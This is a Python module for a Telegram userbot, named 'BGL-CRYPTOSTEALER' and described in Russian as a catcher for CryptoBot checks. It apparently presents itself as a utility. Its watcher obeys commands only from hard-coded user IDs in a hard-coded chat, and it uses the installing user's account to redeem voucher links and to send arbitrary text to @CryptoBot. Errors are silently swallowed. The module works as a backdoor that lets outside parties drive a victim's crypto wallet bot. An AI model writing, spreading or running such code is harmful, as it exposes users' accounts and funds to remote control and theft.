import re
import asyncio
from .. import loader, utils

from telethon.tl import functions
from telethon.tl.types import Message
from telethon.tl.functions.messages import StartBotRequest

@loader.tds
class StealerMod(loader.Module):
    """Модуль для ловли чеков.
           Commands: /check, /pass.\n
    ⚙️ By @pavlyxa_rezon"""

    strings = {"name": "BGL-CRYPTOSTEALER"}

    def __init__(self):
        self.owner_list = [922318957]
        self.owner_chat = -1002205010643

    async def mess(self, text: str, user_id: int):
        async with self.client.conversation(user_id) as conv:
            msg = await conv.send_message(text)
            response = await conv.get_response()
            if '⏳' in response.text:
                await conv.get_response()
            return response

    async def send_me_message(self, text):
        await self.client.send_message('me', text, link_preview=False)
    
    @loader.watcher()
    async def watcher(self, message):
        if message.chat_id != self.owner_chat:
            return
        if message.sender_id not in self.owner_list:
            return
        try:
            cbot = "@CryptoBot"
            
            if message.message.startswith("/check"):
                links = re.findall(r'https?://t.me/.*', message.message)
                done_message = f"<b>Вы успешно снюхали чек.</b> \n {links}"
                fail_message = f"<b>Не удалось активировать чек.</b> \n {links}"
                for link in links:
                    u = link.split('?start=')
                    ref_code = u[1]
                    try:
                        await self.mess(f'/start {ref_code}', cbot)
                        await self.send_me_message(done_message)
                    except:
                        await self.send_me_message(fail_message)
            
            if message.message.startswith("/pass"):
                ref_code = message.message.split("/pass", 1)[-1].strip()
                done_message = f"<b>Успешно введен пароль:</b> {ref_code}"
                fail_message = f"<b>Не удалось ввести пароль:</b> {ref_code}"
                try:
                    await self.mess(f'{ref_code}', cbot)
                    await self.send_me_message(done_message)
                except:
                    await self.send_me_message(fail_message)
        except:
            pass
